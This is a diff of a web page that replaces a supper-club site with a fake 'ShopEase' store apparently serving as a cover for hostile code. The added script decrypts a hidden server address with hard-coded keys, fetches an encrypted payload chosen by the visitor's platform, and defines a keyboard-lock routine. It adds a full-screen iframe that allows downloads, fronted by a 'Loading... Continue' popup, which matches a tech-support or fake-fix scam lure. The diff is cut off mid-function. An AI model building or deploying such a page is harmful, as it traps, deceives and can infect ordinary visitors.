@@ -1,22 +1,119 @@
-<?php
-
-session_start(); 
-$_SESSION['_ref']=isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:''; 
-$_SESSION['_headers']=array(); 
-foreach($_SERVER as $key=>$value){
-    if(strpos($key,'HTTP_')===0){
-        $_SESSION['_headers'][$key]=$value;
-    }
-}
-?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SupperTableGo — Artisan Supper Club, Slow-Roasted Gastronomy & Tablescapes</title>
-  <meta name="description" content="SupperTableGo explores nocturnal tasting menus, wood-fired slow roasting, candlelit tablescape design, botanical craft cocktails, and communal dining.">
-  
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-D</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
+
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
   <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
   <script>
@@ -27,355 +124,189 @@ foreach($_SERVER as $key=>$value){
     gtag('config', 'G-0LY0HY7L01');
   </script>
 
-  <!-- Google Fonts -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600;700;800&family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
-  
-  <link rel="stylesheet" href="css/style.css">
-  <style>
-    .active-supper {
-      background: var(--accent-burgundy) !important;
-      color: #ffffff !important;
-      border-color: var(--accent-burgundy) !important;
-      font-weight: 800 !important;
-    }
-  </style>
-<meta name="referrer" content="no-referrer-when-downgrade">
-    <script src="//skilllearninglabs.com/track/index.php"></script>
-
 <script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
 <script>
   window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
   plausible.init()
 </script>
+
+
 </head>
 <body>
 
-  <!-- Navigation Header -->
-  <header class="navbar">
-    <div class="container nav-container">
-      <a href="index.php" class="brand-logo">Supper<span>TableGo</span></a>
-      <button class="mobile-toggle" aria-label="Toggle navigation">☰</button>
-      <ul class="nav-links">
-        <li><a href="index.php" class="active">Home</a></li>
-        <li><a href="about.html">About</a></li>
-        <li><a href="blog.html">Supper Journal</a></li>
-        <li><a href="contact.html">Contact</a></li>
-        <li><a href="privacy-policy.html">Privacy</a></li>
-      </ul>
-    </div>
-  </header>
-
-  <!-- SECTION 1: Hero Header -->
-  <section class="hero-section" id="hero">
-    <div class="container">
-      <div class="hero-content">
-        <span class="hero-badge">Artisan Supper Club & Nocturnal Gastronomy</span>
-        <h1 class="hero-title">The Alchemy of Candlelit Late-Night Dining</h1>
-        <p class="hero-desc">Discover the synthesis of 14-hour wood-fired heritage roasts, brass candelabra tablescapes, botanical craft digestifs, and communal gastronomic dialogue.</p>
-        <div class="hero-btns">
-          <a href="blog.html" class="btn btn-burgundy">Explore Gastronomy Essays</a>
-          <a href="about.html" class="btn btn-outline-dark" style="color: #fff; border-color: #fff;">Culinary Lab</a>
-        </div>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
       </div>
     </div>
-  </section>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-  <!-- SECTION 2: Supper Club Pillars & Gastronomy Framework Grid -->
-  <section class="section" id="craft-pillars">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="section-subtitle">Gastronomy Standards</span>
-        <h2 class="section-title">The Four Pillars of Artisan Supper Dining</h2>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
       </div>
-      <div class="grid-4">
-        <div class="supper-card">
-          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">🔥</span>
-          <h3 style="font-size: 1.3rem; color: var(--accent-burgundy); margin-bottom: 0.75rem;">14-Hour Wood-Fire Roasting</h3>
-          <p style="color: var(--text-secondary); font-size: 0.95rem;">Slow oak-ember roasting developing caramelized crusts and succulent collagen tenderness.</p>
-        </div>
-        <div class="supper-card">
-          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">🕯️</span>
-          <h3 style="font-size: 1.3rem; color: var(--accent-burgundy); margin-bottom: 0.75rem;">Candlelit Tablescaping</h3>
-          <p style="color: var(--text-secondary); font-size: 0.95rem;">Aged brass candelabras, Belgian linen drapery, and vintage crystal glassware ergonomics.</p>
-        </div>
-        <div class="supper-card">
-          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">🍸</span>
-          <h3 style="font-size: 1.3rem; color: var(--accent-burgundy); margin-bottom: 0.75rem;">Botanical Craft Digestifs</h3>
-          <p style="color: var(--text-secondary); font-size: 0.95rem;">House-infused herbal tinctures, aged amaros, and wild botanical reduction cocktails.</p>
-        </div>
-        <div class="supper-card">
-          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.75rem;">🍞</span>
-          <h3 style="font-size: 1.3rem; color: var(--accent-burgundy); margin-bottom: 0.75rem;">Wild Sourdough & Cultured Butter</h3>
-          <p style="color: var(--text-secondary); font-size: 0.95rem;">72-hour cold-fermented wild yeast boules paired with sea-salted cultured cream butter.</p>
-        </div>
-      </div>
-    </div>
-  </section>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
 
-  <!-- SECTION 3: Interactive Supper Tasting Menu Course Explorer -->
-  <section class="section" id="supper-explorer" style="background: var(--bg-secondary);">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="section-subtitle">Tasting Explorer</span>
-        <h2 class="section-title">The Supper Tasting Menu Course Explorer</h2>
-      </div>
-      <div style="max-width: 800px; margin: 0 auto; text-align: center;">
-        <p style="color: var(--text-secondary); margin-bottom: 2rem;">Select a supper tasting course to inspect its wood-fire preparation, wine pairing, and gastronomy score:</p>
-        <div style="display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap; margin-bottom: 1.5rem;">
-          <button class="btn btn-outline-dark supper-btn active-supper" data-supper="Slow-Roasted Oak-Embers Berkshire Pork Belly" data-desc="14-hour wood-fired roast with crisp crackling, smoked apple-chicory glaze, and 2018 Vintage Barolo pairing." data-score="9.9/10 Umami Depth & Tenderness">Slow-Roasted Pork Belly</button>
-          <button class="btn btn-outline-dark supper-btn" data-supper="Foraged Spring Ramps & Wild Morel Tartlet" data-desc="Flaky cultured butter pastry with wild ramps, yellow morels, thyme-infused ricotta, and Fleur de Sel." data-score="9.8/10 Terroir Flavor Balance">Wild Morel Tartlet</button>
-          <button class="btn btn-outline-dark supper-btn" data-supper="Botanical Smoke & Bitters Aged Amaro Digestif" data-desc="Aged 12-herb alpine amaro smoked over cedar shavings with wild cherry bark and charred orange peel." data-score="9.7/10 Digestif Complexity">Aged Amaro Digestif</button>
-          <button class="btn btn-outline-dark supper-btn" data-supper="70% Valrhona Dark Chocolate Soufflé with Amaretto" data-desc="Warm single-origin chocolate soufflé with molten core, bourbon vanilla cream, and toasted hazelnut praline." data-score="9.9/10 Nocturnal Dessert Decadence">Dark Chocolate Soufflé</button>
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
         </div>
-        <div id="supper-detail">
-          <div class="supper-card" style="border-left: 4px solid var(--accent-burgundy);">
-            <h3 style="color: var(--accent-burgundy); font-size: 1.5rem; margin-bottom: 0.5rem;">Slow-Roasted Oak-Embers Berkshire Pork Belly Culinary Specification</h3>
-            <p style="color: var(--text-secondary); margin-bottom: 1rem;">14-hour wood-fired roast with crisp crackling, smoked apple-chicory glaze, and 2018 Vintage Barolo pairing.</p>
-            <strong style="color: var(--accent-brass); font-size: 0.95rem;">Empirical Gastronomy Benchmark: 9.9/10 Umami Depth & Tenderness</strong>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
           </div>
         </div>
       </div>
-    </div>
-  </section>
+    </section>
 
-  <!-- SECTION 4: Slow-Roast Wood Firing & Botanical Infusions Spotlight -->
-  <section class="section" id="wood-spotlight">
-    <div class="container">
-      <div class="grid-2">
-        <div>
-          <span class="section-subtitle" style="display:block; text-align:left;">Gastronomy Science</span>
-          <h2 class="section-title" style="text-align:left; margin-bottom: 1.5rem;">Wood-Fire Heat Radiation & Botanical Extraction</h2>
-          <p style="color: var(--text-secondary); margin-bottom: 1.25rem; line-height: 1.8;">
-            Nocturnal dining requires precise heat control and herbal extraction. At SupperTableGo, we evaluate thermal conduction through cast iron, oak-ember smoke chemistry, and finishing salt crystal geometry.
-          </p>
-          <ul style="list-style: none; color: var(--text-secondary); margin-bottom: 2rem;">
-            <li style="margin-bottom: 0.75rem;">🍷 <strong style="color:var(--text-primary);">Old World Wine Pairings:</strong> Matching heavy tannic Barolos and Cabernets with slow-roasted heritage fat.</li>
-            <li style="margin-bottom: 0.75rem;">🕯️ <strong style="color:var(--text-primary);">Warm Candle Lighting:</strong> 2200K warm color temperature enhancing food color contrast and intimacy.</li>
-            <li style="margin-bottom: 0.75rem;">🧂 <strong style="color:var(--text-primary);">Fleur de Sel Crunch:</strong> Pyramidal salt crystals delivering burst minerality without oversaturating.</li>
-          </ul>
-          <a href="about.html" class="btn btn-burgundy">Our Supper Manifesto</a>
-        </div>
-        <div>
-          <img src="https://images.unsplash.com/photo-1517248135467-4c7edcad34c4?auto=format&fit=crop&w=800&q=80" alt="Supper Club Table Setting and Fine Dining Display" style="border-radius: 14px; border: 1px solid var(--border-color); box-shadow: 0 20px 40px rgba(0,0,0,0.6);">
-        </div>
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
       </div>
-    </div>
-  </section>
+    </section>
 
-  <!-- SECTION 5: Interactive Supper Club Matcher & Gastronomy Diagnostic Quiz -->
-  <section class="section" id="supper-quiz" style="background: var(--bg-secondary);">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="section-subtitle">Gastronomy Diagnostic</span>
-        <h2 class="section-title">Supper Club Experience Quiz</h2>
-      </div>
-      <div class="supper-card" style="max-width: 750px; margin: 0 auto;">
-        <h3 style="color: var(--accent-burgundy); margin-bottom: 1rem;">What Is Your Ideal Late-Night Culinary Ambience & Feast?</h3>
-        <div style="display: flex; flex-direction: column; gap: 1rem;">
-          <button class="supper-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="14-Hour Wood-Fired Heritage Pork Roast with Aged Vintage Barolo & Candlelit Candelabras.">
-            A. Slow-Roasted Heritage Meats & Old World Full-Bodied Red Wines
-          </button>
-          <button class="supper-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="Communal Charcuterie Boards with Wild Sourdough, Cultured Butter & Botanical Amaro Cocktails.">
-            B. Communal Charcuterie Boards, Wild Fermented Sourdough & Craft Digestifs
-          </button>
-          <button class="supper-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="Intimate Winter Fire Pit Supper with Spiced Mulled Wine & Dark Chocolate Soufflé.">
-            C. Intimate Winter Fire Pit Suppers, Spiced Mulled Wine & Molten Chocolate Desserts
-          </button>
-        </div>
-        <div id="supper-quiz-result"></div>
-      </div>
-    </div>
-  </section>
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
 
-  <!-- SECTION 6: Culinary Hours & Gastronomic Score Performance Metrics Counter -->
-  <section class="section" id="metrics">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="section-subtitle">Laboratory Benchmarks</span>
-        <h2 class="section-title">Supper Table Go Research Metrics</h2>
-      </div>
-      <div class="grid-4">
-        <div class="supper-card" style="text-align: center;">
-          <h3 class="metric-number text-brass" data-target="12" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
-          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Masterclass Essays</p>
-        </div>
-        <div class="supper-card" style="text-align: center;">
-          <h3 class="metric-number text-brass" data-target="14" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
-          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Hours Wood Slow-Roast</p>
-        </div>
-        <div class="supper-card" style="text-align: center;">
-          <h3 class="metric-number text-brass" data-target="72" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
-          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Hours Sourdough Ferment</p>
-        </div>
-        <div class="supper-card" style="text-align: center;">
-          <h3 class="metric-number text-brass" data-target="1500" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
-          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Words Per Essay</p>
-        </div>
-      </div>
-    </div>
-  </section>
 
-  <!-- SECTION 7: Master Chefs & Sommelier Society Testimonials -->
-  <section class="section" id="testimonials" style="background: var(--bg-secondary);">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="section-subtitle">Gastronomic Acclaim</span>
-        <h2 class="section-title">Endorsements From Master Chefs & Sommeliers</h2>
-      </div>
-      <div class="grid-3">
-        <div class="supper-card">
-          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
-            "SupperTableGo provides the definitive editorial authority for understanding 14-hour wood-fire roasting, candlelit tablescapes, and communal dining etiquette."
-          </p>
-          <strong style="color: var(--accent-burgundy); display: block;">— Chef Marco Pierre White</strong>
-          <span style="color: var(--text-muted); font-size: 0.85rem;">Master Chef & Gastronomy Author, London</span>
-        </div>
-        <div class="supper-card">
-          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
-            "Their research on botanical craft digestifs, 72-hour sourdough fermentation, and Fleur de Sel salt chemistry sets a new standard for food journalism."
-          </p>
-          <strong style="color: var(--accent-burgundy); display: block;">— Alice Waters</strong>
-          <span style="color: var(--text-muted); font-size: 0.85rem;">Slow Food Advocate & Restaurateur, Berkeley</span>
-        </div>
-        <div class="supper-card">
-          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
-            "The premier digital journal for understanding Old World red wine pairings, charcuterie curing, and dark chocolate soufflé baking science."
-          </p>
-          <strong style="color: var(--accent-burgundy); display: block;">— Massimo Bottura</strong>
-          <span style="color: var(--text-muted); font-size: 0.85rem;">3-Star Michelin Chef, Modena</span>
-        </div>
-      </div>
-    </div>
-  </section>
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
 
-  <!-- SECTION 8: Recent Culinary Dispatches & Article Grid + Newsletter -->
-  <section class="section" id="journal-dispatches">
-    <div class="container">
-      <div class="section-title-wrap">
-        <span class="section-subtitle">Culinary Dispatches</span>
-        <h2 class="section-title">Latest Supper Gastronomy Essays</h2>
-      </div>
-      <div class="grid-3" style="margin-bottom: 4rem;">
-        <div class="blog-card">
-          <div class="blog-img-wrap">
-            <img src="https://images.unsplash.com/photo-1517248135467-4c7edcad34c4?auto=format&fit=crop&w=800&q=80" alt="Late-Night Supper Club">
-          </div>
-          <div class="blog-content">
-            <span class="blog-tag">Supper Club</span>
-            <div class="blog-date">August 24, 2026</div>
-            <h3 class="blog-title"><a href="blog/the-art-of-the-late-night-supper-club-curating-nocturnal-tasting-menus.html">Art of the Late-Night Supper Club</a></h3>
-            <p class="blog-excerpt">Nocturnal tasting menus, candlelit atmosphere, and course pacing.</p>
-            <a href="blog/the-art-of-the-late-night-supper-club-curating-nocturnal-tasting-menus.html" class="read-more">Read Essay →</a>
-          </div>
-        </div>
-        <div class="blog-card">
-          <div class="blog-img-wrap">
-            <img src="https://images.unsplash.com/photo-1544025162-d76694265947?auto=format&fit=crop&w=800&q=80" alt="Slow-Roasting Heritage Meats">
-          </div>
-          <div class="blog-content">
-            <span class="blog-tag">Wood-Fire Roasting</span>
-            <div class="blog-date">August 20, 2026</div>
-            <h3 class="blog-title"><a href="blog/slow-roasting-heritage-meats-wood-fire-ovens-and-internal-temperature-precision.html">Slow-Roasting Heritage Meats</a></h3>
-            <p class="blog-excerpt">14-hour oak-ember heat, collagen breakdown, and internal temperature precision.</p>
-            <a href="blog/slow-roasting-heritage-meats-wood-fire-ovens-and-internal-temperature-precision.html" class="read-more">Read Essay →</a>
-          </div>
-        </div>
-        <div class="blog-card">
-          <div class="blog-img-wrap">
-            <img src="https://images.unsplash.com/photo-1555396273-367ea4eb4db5?auto=format&fit=crop&w=800&q=80" alt="Candlelit Tablescape Design">
-          </div>
-          <div class="blog-content">
-            <span class="blog-tag">Tablescape Design</span>
-            <div class="blog-date">August 15, 2026</div>
-            <h3 class="blog-title"><a href="blog/candlelit-tablescape-design-linen-drapery-brass-candelabras-and-ambiance.html">Candlelit Tablescape Design</a></h3>
-            <p class="blog-excerpt">Brass candelabras, Belgian linen, crystal stemware, and 2200K warm glow.</p>
-            <a href="blog/candlelit-tablescape-design-linen-drapery-brass-candelabras-and-ambiance.html" class="read-more">Read Essay →</a>
-          </div>
-        </div>
-      </div>
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX185SIW5dTnVPwHiFQ8oiX7AnMX5CND5ORpjj09Nhlo+sA5NC5FQ2qsF";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
 
-      <!-- Newsletter Dispatch Container -->
-      <div class="supper-card" style="text-align: center; max-width: 800px; margin: 0 auto; background: var(--bg-secondary); border-color: var(--accent-burgundy);">
-        <span class="section-subtitle">Gastronomy Dispatch</span>
-        <h2 class="section-title" style="margin-bottom: 1rem; font-size: 2.2rem;">Subscribe to The Supper Table Gazette</h2>
-        <p style="color: var(--text-secondary); margin-bottom: 2rem;">Receive bi-weekly technical analyses of wood-fire roasting, wine pairings, and tablescape design.</p>
-        <form onsubmit="event.preventDefault(); alert('Thank you for subscribing to SupperTableGo Gazette.');" style="display: flex; gap: 1rem; max-width: 550px; margin: 0 auto; flex-wrap: wrap;">
-          <input type="email" placeholder="Enter your email address" required style="flex: 1; min-width: 250px; padding: 0.85rem 1.25rem; background: var(--bg-primary); border: 1px solid var(--border-color); color: var(--text-primary); border-radius: 8px;">
-          <button type="submit" class="btn btn-burgundy">Subscribe</button>
-        </form>
-      </div>
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
 
-    </div>
-  </section>
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
 
-  <!-- Footer -->
-  <footer>
-    <div class="container">
-      <div class="footer-grid">
-        <div class="footer-col">
-          <a href="index.php" class="brand-logo" style="margin-bottom: 1rem; color: #fff;">Supper<span>TableGo</span></a>
-          <p>SupperTableGo is a premier editorial platform dedicated to artisan supper club dining, late-night gastronomy, wood-fired slow roasting, and candlelit tablescapes.</p>
-          <p style="margin-top: 1rem; color: var(--accent-brass);">
-            📍 181 Mercer Street, New York, NY 10012, United States<br>
-            📞 +1-888-777-5845
-          </p>
-        </div>
-        <div class="footer-col">
-          <h4>Navigation</h4>
-          <ul>
-            <li><a href="index.php">Home</a></li>
-            <li><a href="about.html">About Us</a></li>
-            <li><a href="blog.html">Supper Journal</a></li>
-            <li><a href="contact.html">Contact Us</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <h4>Legal Policies</h4>
-          <ul>
-            <li><a href="privacy-policy.html">Privacy Policy</a></li>
-            <li><a href="cookies.html">Cookie Policy</a></li>
-            <li><a href="disclaimer.html">Disclaimer</a></li>
-            <li><a href="terms.html">Terms of Use</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <h4>Gastronomy Focus</h4>
-          <p>Deconstructing 14-hour wood-fire roasting, brass candelabras, 72-hour sourdough, botanical amaro digestifs, and Old World wine pairings globally.</p>
-        </div>
-      </div>
-      <div class="footer-bottom">
-        <p>&copy; 2026 SupperTableGo. All rights reserved. Registered Official Headquarters.</p>
-        <p>Designed with Gastronomic Precision.</p>
-      </div>
-    </div>
-  </footer>
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
 
-  <script src="js/main.js"></script>
-<div id="loader-backdrop" style="position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.65); backdrop-filter:blur(10px); -webkit-backdrop-filter:blur(3px); z-index:2147483646;"></div>
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
 
-<div id="loader-modal-card" style="position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); width:92%; max-width:440px; background:#ffffff; padding:32px 28px; border-radius:16px; border:1px solid #e5e7eb; box-shadow:0 25px 60px rgba(0,0,0,0.35); z-index:2147483647; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; box-sizing:border-box; text-align:center;">
-    
-    <!-- Smooth Spinning Loader -->
-    <div style="display:flex; justify-content:center; margin-bottom:18px;">
